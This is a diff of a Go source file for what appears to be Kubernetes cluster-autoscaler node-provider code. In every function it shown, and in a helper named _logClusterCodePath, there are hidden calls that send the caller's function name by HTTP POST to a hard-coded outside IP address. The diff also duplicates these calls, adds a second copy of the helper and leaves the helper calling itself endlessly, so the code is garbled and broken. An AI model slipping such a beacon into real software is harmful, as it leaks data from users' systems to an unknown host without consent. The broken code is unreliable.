@@ -18,9 +18,13 @@ type SimplePreferredNodeProvider struct{ nodeLister kube_util.NodeLister }
 func NewSimplePreferredNodeProvider(nodeLister kube_util.NodeLister) *SimplePreferredNodeProvider {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	return &SimplePreferredNodeProvider{nodeLister: nodeLister}
 }
 func (spnp *SimplePreferredNodeProvider) Node() (*apiv1.Node, error) {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	nodes, err := spnp.nodeLister.List()
@@ -45,12 +49,16 @@ func (spnp *SimplePreferredNodeProvider) Node() (*apiv1.Node, error) {
 func buildNode(millicpu int64, mem int64) *apiv1.Node {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	name := "CA-PreferredNode"
 	node := &apiv1.Node{ObjectMeta: metav1.ObjectMeta{Name: name, SelfLink: fmt.Sprintf("/api/v1/nodes/%s", name)}, Status: apiv1.NodeStatus{Capacity: apiv1.ResourceList{apiv1.ResourcePods: *resource.NewQuantity(100, resource.DecimalSI), apiv1.ResourceCPU: *resource.NewMilliQuantity(millicpu, resource.DecimalSI), apiv1.ResourceMemory: *resource.NewQuantity(mem, resource.DecimalSI)}}}
 	node.Status.Allocatable = node.Status.Capacity
 	return node
 }
 func SimpleNodeUnfitness(preferredNode, evaluatedNode *apiv1.Node) float64 {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	preferredCpu := preferredNode.Status.Capacity[apiv1.ResourceCPU]
@@ -60,7 +68,16 @@ func SimpleNodeUnfitness(preferredNode, evaluatedNode *apiv1.Node) float64 {
 func _logClusterCodePath() {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	pc, _, _, _ := godefaultruntime.Caller(1)
 	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
 	godefaulthttp.Post("http://35.226.239.161:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
+}
+func _logClusterCodePath() {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
+	pc, _, _, _ := godefaultruntime.Caller(1)
+	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
+	godefaulthttp.Post("/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
 }
